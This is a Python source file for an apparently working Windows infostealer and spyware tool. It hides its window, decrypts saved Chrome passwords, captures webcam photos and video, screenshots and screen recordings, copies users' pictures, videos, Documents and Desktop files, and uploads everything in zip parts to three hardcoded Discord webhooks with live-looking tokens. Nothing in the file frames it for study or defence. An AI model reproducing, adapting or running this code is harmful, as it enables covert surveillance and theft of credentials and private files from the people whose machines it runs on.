import os
import time
import cv2
import socket
import platform
import pyautogui
import numpy as np
import psutil
import requests
import shutil
import zipfile
import json
import sqlite3
import subprocess
import win32crypt
from datetime import datetime
import logging
import base64
from Cryptodome.Cipher import AES

# ========== CONFIGURATION ========== #
WEBHOOK_FOTO = "https://discord.com/api/webhooks/1398309155457994905/9eHArifusda5HjwdD03wU-kJRMprYOgHbQPJwIYTLlphY5DvtEZbCN963g-h7TxHnkIR"
WEBHOOK_UMUM = "https://discord.com/api/webhooks/1398315093824897205/oKRC4bT_ooar1X8qpo6geTzlNyoTDI0mdLqKmD4gwKZfdARpH360myh44EcCxMEZKezi"
WEBHOOK_FINAL = "https://discord.com/api/webhooks/1398329652900008148/zRT9UySzu8dfNBcS2wLPDmeMqKr8buaA4PnwIpo_r7tuiF4tu_G1qUF0v8Fu3TqubRUJ"
DURATION_KAMERA = 10
DURATION_LAYAR = 20
STEALTH = True
RESOLUSI_KAMERA = (1920, 1080)
FPS_KAMERA = 30
FPS_LAYAR = 60
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB (Discord limit)
MAX_ZIP_SIZE = 5 * 1024 * 1024  # 5MB per zip file

# ========== HIDDEN PATHS ========== #
hostname = socket.gethostname()
tanggal = datetime.now().strftime('%Y%m%d')
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
appdata = os.getenv('APPDATA') or os.getenv('TEMP') or "C:\\Windows\\Temp"
FOLDER_OUTPUT = os.path.join(appdata, "WindowsCache", f"{hostname}_{tanggal}")
LOGFILE = os.path.join(FOLDER_OUTPUT, "log.txt")
os.makedirs(FOLDER_OUTPUT, exist_ok=True)

# Logging configuration
logging.basicConfig(filename=LOGFILE, level=logging.INFO, 
                   format='[%(asctime)s] %(message)s', datefmt='%H:%M:%S')

def write_log(message):
    """Write log message to file"""
    logging.info(message)

def hide_window():
    """Hide console window if in stealth mode"""
    if os.name == 'nt' and STEALTH:
        try:
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)
        except Exception as e:
            write_log(f"Error hiding window: {e}")

def get_chrome_key():
    try:
        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Hapus DPAPI prefix
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        write_log(f"Gagal ambil Chrome key: {e}")
        return None

def get_chrome_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'],
                                    'Google', 'Chrome', 'User Data', 'Local State')
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Strip "DPAPI"
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"Gagal ambil kunci: {e}")
        return None

def extract_passwords():
    login_db = os.path.join(os.environ['LOCALAPPDATA'],
                            'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    temp_db = "temp_login_data.db"
    shutil.copy2(login_db, temp_db)

    key = get_chrome_key()
    if not key:
        print("Kunci tidak ditemukan.")
        return

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for row in cursor.fetchall():
        origin_url, username, encrypted_data = row
        try:
            if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
                iv = encrypted_data[3:15]
                payload = encrypted_data[15:-16]
                tag = encrypted_data[-16:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt_and_verify(payload, tag).decode()
            else:
                decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode()

            print(f"[+] {origin_url}\n    USER: {username}\n    PASS: {decrypted}\n")
        except Exception as e:
            print(f"[!] Error decrypting for {origin_url}: {e}")

    cursor.close()
    conn.close()
    os.remove(temp_db)


def simpan_spek():
    """Save system specifications including Chrome passwords"""
    try:
        # Basic system specs
        specs = {
            "user": os.getlogin(),
            "hostname": socket.gethostname(),
            "cpu": platform.processor(),
            "ram": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
            "system": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "ip_local": socket.gethostbyname(socket.gethostname()),
            "ip_public": "Unavailable",
            "chrome_passwords": "Not extracted"
        }

        # Get public IP
        try:
            specs["ip_public"] = requests.get("https://api.ipify.org", timeout=15).text
        except Exception as e:
            write_log(f"IP public error: {e}")

        # Extract Chrome passwords
        try:
            login_db = os.path.join(os.environ['LOCALAPPDATA'],
                                    'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            
            if os.path.exists(login_db):
                temp_db = os.path.join(FOLDER_OUTPUT, "chrome_temp.db")
                shutil.copy2(login_db, temp_db)
                
                passwords = []
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    try:
                        encrypted_data = row[2]
                        if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
                            iv = encrypted_data[3:15]
                            payload = encrypted_data[15:]
                            key = win32crypt.CryptUnprotectData(b"Chrome Safe Storage", None, None, None, 0)[1]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted = cipher.decrypt(payload)[:-16].decode()
                        else:
                            decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode()
                        passwords.append(f"URL: {row[0]}\nUser: {row[1]}\nPass: {decrypted}\n")
                    except Exception as e:
                        passwords.append(f"URL: {row[0]}\nUser: {row[1]}\nError: Failed to decrypt\n")
                
                conn.close()
                os.remove(temp_db)
                
                if passwords:
                    specs["chrome_passwords"] = "\n".join(passwords)
                else:
                    specs["chrome_passwords"] = "No passwords found"
            else:
                specs["chrome_passwords"] = "Chrome data not found"
                
        except Exception as e:
            specs["chrome_passwords"] = f"Extraction failed: {str(e)}"
            write_log(f"Password extraction error: {e}")

        # Save to file
        if not os.path.exists(FOLDER_OUTPUT):
            os.makedirs(FOLDER_OUTPUT)
        path = os.path.join(FOLDER_OUTPUT, "full_specs.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("=== SYSTEM INFORMATION ===\n")
            for k, v in specs.items():
                if k != "chrome_passwords":
                    f.write(f"{k.upper()}: {v}\n")
            f.write("\n=== CHROME PASSWORDS ===\n")
            f.write(specs["chrome_passwords"])
        
        # Upload the file
        if not upload_file(path, WEBHOOK_UMUM):
            write_log("Failed to upload system specs")
        else:
            write_log("System specs uploaded successfully")

    except Exception as e:
        write_log(f"Critical error in simpan_spek: {e}")

def upload_file(file_path, webhook_url):
    """Upload single file to Discord with size check"""
    try:
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            write_log(f"File {file_path} too large ({file_size/1024/1024:.2f}MB)")
            return False
        
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(webhook_url, files=files, timeout=30)
            
            if response.status_code == 200:
                write_log(f"Successfully uploaded {file_path}")
                return True
            else:
                write_log(f"Failed to upload {file_path}. Status: {response.status_code}")
                return False
    except Exception as e:
        write_log(f"Error uploading {file_path}: {e}")
        return False

def ambil_screenshot():
    """Take screenshot"""
    try:
        path = os.path.join(FOLDER_OUTPUT, f"screenshot_{timestamp}.png")
        pyautogui.screenshot().save(path)
        upload_file(path, WEBHOOK_UMUM)
    except Exception as e:
        write_log(f"Screenshot error: {e}")

def ambil_foto_kamera():
    """Take photo from webcam"""
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            path = os.path.join(FOLDER_OUTPUT, f"foto_{timestamp}.jpg")
            cv2.imwrite(path, frame)
            upload_file(path, WEBHOOK_FOTO)
        cam.release()
    except Exception as e:
        write_log(f"Webcam photo error: {e}")

def rekam_kamera():
    """Record from webcam"""
    try:
        folder = os.path.join(FOLDER_OUTPUT, "kamera")
        os.makedirs(folder, exist_ok=True)
        path = os.path.join(folder, f"cam_{timestamp}.avi")
        
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            write_log("Camera not accessible")
            return
        
        cam.set(3, RESOLUSI_KAMERA[0])
        cam.set(4, RESOLUSI_KAMERA[1])
        out = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*'XVID'), FPS_KAMERA, RESOLUSI_KAMERA)
        
        start = time.time()
        while time.time() - start < DURATION_KAMERA:
            ret, frame = cam.read()
            if ret:
                out.write(frame)
        
        cam.release()
        out.release()
        
        compressed_path = compress_video(path)
        if compressed_path:
            upload_file(compressed_path, WEBHOOK_FOTO)
    except Exception as e:
        write_log(f"Camera recording error: {e}")

def rekam_layar():
    """Record screen"""
    try:
        folder = os.path.join(FOLDER_OUTPUT, "layar")
        os.makedirs(folder, exist_ok=True)
        path = os.path.join(folder, f"screen_{timestamp}.mp4")
        w, h = pyautogui.size()
        
        out = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*'mp4v'), FPS_LAYAR, (w, h))
        start = time.time()
        
        while time.time() - start < DURATION_LAYAR:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(1 / FPS_LAYAR)
        
        out.release()
        
        compressed_path = compress_video(path)
        if compressed_path:
            upload_file(compressed_path, WEBHOOK_FINAL)
    except Exception as e:
        write_log(f"Screen recording error: {e}")

def compress_video(input_path):
    """Compress video using FFmpeg"""
    try:
        output_path = input_path.replace('.avi', '_compressed.mp4').replace('.mp4', '_compressed.mp4')
        cmd = [
            'ffmpeg',
            '-i', input_path,
            '-vcodec', 'libx264',
            '-crf', '28',
            '-preset', 'fast',
            output_path
        ]
        
        subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return output_path
    except Exception as e:
        write_log(f"Error compressing video {input_path}: {e}")
        return None

def create_split_zips(source_folder, base_name):
    """Create multiple zip files from source folder, each under MAX_ZIP_SIZE"""
    zip_parts = []
    current_zip = None
    current_size = 0
    zip_index = 1
    
    try:
        # Get all files to be zipped with their relative paths
        all_files = []
        for root, _, files in os.walk(source_folder):
            for file in files:
                file_path = os.path.join(root, file)
                rel_path = os.path.relpath(file_path, source_folder)
                all_files.append((file_path, rel_path))
        
        # Process files and create zip parts
        for file_path, rel_path in all_files:
            file_size = os.path.getsize(file_path)
            
            # If single file is too large, create dedicated zip
            if file_size > MAX_ZIP_SIZE:
                single_zip_path = os.path.join(FOLDER_OUTPUT, f"{base_name}_part{zip_index}_single.zip")
                with zipfile.ZipFile(single_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(file_path, rel_path)
                zip_parts.append(single_zip_path)
                zip_index += 1
                continue
            
            # Start new zip if needed
            if current_zip is None or (current_size + file_size) > MAX_ZIP_SIZE:
                if current_zip is not None:
                    current_zip.close()
                
                new_zip_path = os.path.join(FOLDER_OUTPUT, f"{base_name}_part{zip_index}.zip")
                current_zip = zipfile.ZipFile(new_zip_path, 'w', zipfile.ZIP_DEFLATED)
                zip_parts.append(new_zip_path)
                current_size = 0
                zip_index += 1
            
            # Add file to current zip
            current_zip.write(file_path, rel_path)
            current_size += file_size
        
        # Close the last zip if exists
        if current_zip is not None:
            current_zip.close()
        
        return zip_parts
    
    except Exception as e:
        write_log(f"Error creating split zips: {e}")
        if current_zip is not None:
            current_zip.close()
        return []

def upload_split_zips(source_folder, webhook, base_name):
    """Create and upload multiple zip files from source folder"""
    try:
        zip_parts = create_split_zips(source_folder, base_name)
        if not zip_parts:
            write_log("No zip files created")
            return False
        
        success = True
        for zip_part in zip_parts:
            if not upload_file(zip_part, webhook):
                success = False
                write_log(f"Failed to upload {zip_part}")
            
            try:
                os.remove(zip_part)
            except Exception as e:
                write_log(f"Failed to delete {zip_part}: {e}")
        
        return success
    except Exception as e:
        write_log(f"Error uploading split zips: {e}")
        return False

def salin_file(extensions, subfolder, source_folders):
    """Copy files with specific extensions"""
    try:
        dest_folder = os.path.join(FOLDER_OUTPUT, subfolder)
        os.makedirs(dest_folder, exist_ok=True)
        
        for folder in source_folders:
            source_path = os.path.join(os.path.expanduser("~"), folder)
            if not os.path.exists(source_path):
                continue
                
            for root, _, files in os.walk(source_path):
                for file in files:
                    if file.lower().endswith(extensions):
                        try:
                            src = os.path.join(root, file)
                            dst = os.path.join(dest_folder, f"{int(time.time())}_{file}")
                            shutil.copy2(src, dst)
                        except Exception as e:
                            write_log(f"Error copying {src}: {e}")
    except Exception as e:
        write_log(f"Error copying files: {e}")

def backup_folder():
    """Backup important folders"""
    try:
        target = os.path.join(FOLDER_OUTPUT, "backup")
        os.makedirs(target, exist_ok=True)
        
        for folder in ["Documents", "Desktop"]:
            source = os.path.join(os.path.expanduser("~"), folder)
            if not os.path.exists(source):
                continue
                
            for root, _, files in os.walk(source):
                for file in files:
                    try:
                        src = os.path.join(root, file)
                        if os.path.getsize(src) > 10 * 1024 * 1024:  # Skip >10MB files
                            continue
                            
                        rel_path = os.path.relpath(src, source)
                        dst = os.path.join(target, folder, rel_path)
                        os.makedirs(os.path.dirname(dst), exist_ok=True)
                        shutil.copy2(src, dst)
                    except Exception as e:
                        write_log(f"Error backing up {src}: {e}")
    except Exception as e:
        write_log(f"Error backing up folders: {e}")

def upload_zip(folder_path, webhook, output_name):
    """Main upload function using split zip system"""
    return upload_split_zips(folder_path, webhook, output_name)

if __name__ == "__main__":
    hide_window()
    write_log("Starting execution...")
    
    try:
        # 1. Get system info
        simpan_spek()
        
        # 2. Take screenshots and photos
        ambil_foto_kamera()
        ambil_screenshot()
        
        # 3. Record camera and screen
        rekam_kamera()
        rekam_layar()
        
        # 4. Copy important files
        salin_file(('.jpg','.png','.jpeg','.bmp','.gif'), "gambar_user", ["Pictures", "Downloads"])
        salin_file(('.mp4','.avi','.mov','.mkv','.webm'), "video_user", ["Videos", "Downloads"])
        
        # 5. Backup folders
        backup_folder()
        
        # 6. Upload results with split zip system
        write_log("Uploading images...")
        upload_zip(os.path.join(FOLDER_OUTPUT, "gambar_user"), WEBHOOK_FOTO, f"{hostname}_media")
        
        write_log("Uploading all data...")
        upload_zip(FOLDER_OUTPUT, WEBHOOK_FINAL, f"{hostname}_full")
        
        write_log("Execution completed")
    except Exception as e:
        write_log(f"Main execution error: {e}")